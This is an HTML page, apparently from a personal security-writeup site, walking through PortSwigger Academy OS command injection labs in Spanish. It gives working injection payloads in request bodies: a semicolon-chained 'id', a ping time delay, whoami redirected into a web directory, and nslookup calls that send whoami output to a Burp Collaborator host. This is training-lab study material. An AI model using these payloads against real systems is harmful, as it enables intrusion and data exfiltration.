@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>OS Command Injection | PortSwigger · cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <style>
+    .code-block { background:#0a0a0a; border:1px solid #333; border-radius:6px; padding:1rem; overflow-x:auto; color:#9fef00; font-size:0.85rem; }
+  </style>
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <div class="d-flex gap-2">
+        <a href="../writeups.html#portswigger" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> PortSwigger</a>
+        <a href="../writeups.html" class="btn btn-sm btn-outline-secondary"><i class="bi bi-house"></i> Inicio</a>
+      </div>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="mb-4 p-4 rounded" style="background:#111;border:1px solid #222">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge fs-6" style="background:#ff6633">PortSwigger</span>
+        <span class="badge bg-warning text-dark fs-6">OS Command Injection</span>
+        <span class="badge bg-secondary">Blind</span>
+        <span class="badge bg-secondary">Time Delay</span>
+        <span class="badge bg-secondary">OOB</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">OS Command Injection</h1>
+      <p class="text-secondary mb-0">Inyección de comandos del sistema operativo: casos directos, blind con delays, redirección de output y técnicas out-of-band.</p>
+    </div>
+
+    <!-- Executing arbitrary commands -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-terminal"></i> Executing arbitrary commands</h3>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 1</span>OS command injection, simple case</h5>
+      <p class="text-secondary">Interceptar la consulta del botón <strong>Check stock</strong> con Burp Suite y enviarla al Repeater. Agregar el comando al parámetro <code>storeId</code> usando <code>;</code> como separador.</p>
+      <img src="../img/command1.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <pre class="code-block"><code>productId=2&amp;storeId=1 ; id</code></pre>
+      <img src="../img/command1.2.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <!-- Blind OS command injection -->
+    <h3 class="text-danger mt-4 mb-3"><i class="bi bi-eye-slash"></i> Blind OS command injection vulnerabilities</h3>
+
+    <h4 class="text-warning mt-3 mb-2">Detecting blind OS command injection using time delays</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 2</span>Blind OS command injection with time delays</h5>
+      <p class="text-secondary">Interceptar el envío del formulario de feedback. El parámetro vulnerable es <code>email</code>. Usar <code>ping</code> para generar un delay de ~10 segundos.</p>
+      <img src="../img/command3.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <pre class="code-block"><code>csrf=TOKEN&amp;name=test&amp;email=gato@gmail.com||ping+-c+10+127.0.0.1||&amp;subject=test&amp;message=test</code></pre>
+    </section>
+
+    <h4 class="text-warning mt-3 mb-2">Exploiting blind OS command injection by redirecting output</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 4</span>Blind OS command injection with output redirection</h5>
+      <p class="text-secondary">Redirigir la salida del comando al directorio <code>/var/www/images/</code> (accesible vía web). Luego acceder al archivo resultado a través del endpoint de imágenes.</p>
+      <pre class="code-block"><code>csrf=TOKEN&amp;name=test&amp;email=gato%40gmail.com||whoami>/var/www/images/miau.txt||&amp;subject=test&amp;message=test</code></pre>
+      <pre class="code-block"><code># Leer resultado:
+https://LAB-ID.web-security-academy.net/image?filename=miau.txt</code></pre>
+    </section>
+
+    <h4 class="text-warning mt-3 mb-2">Exploiting blind OS command injection using out-of-band (OAST) techniques</h4>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 5</span>Blind OS command injection with out-of-band interaction</h5>
+      <p class="text-secondary">Usar el <strong>Burp Collaborator Client</strong> para obtener un subdominio. Inyectar un <code>nslookup</code> al dominio del Collaborator para verificar la interacción DNS.</p>
+      <img src="../img/command5.1.png" class="img-fluid rounded my-3 border border-secondary">
+      <pre class="code-block"><code>csrf=TOKEN&amp;name=test&amp;email=gato%40gmail.com||nslookup+COLLABORATOR-SUBDOMAIN.burpcollaborator.net||&amp;subject=test&amp;message=test</code></pre>
+      <img src="../img/command5.2.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+    <section class="mb-4">
+      <h5><span class="badge bg-danger me-2">Lab 6</span>Blind OS command injection with out-of-band data exfiltration</h5>
+      <p class="text-secondary">Exfiltrar la salida de un comando como subdominio DNS al Burp Collaborator. Usar backticks para capturar el output de <code>whoami</code> e incluirlo en la consulta DNS.</p>
+      <pre class="code-block"><code>csrf=TOKEN&amp;name=test&amp;email=gato%40gmail.com||nslookup+`whoami`.COLLABORATOR-SUBDOMAIN.burpcollaborator.net||&amp;subject=test&amp;message=test</code></pre>
+      <img src="../img/command6.1.png" class="img-fluid rounded my-3 border border-secondary">
+    </section>
+
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
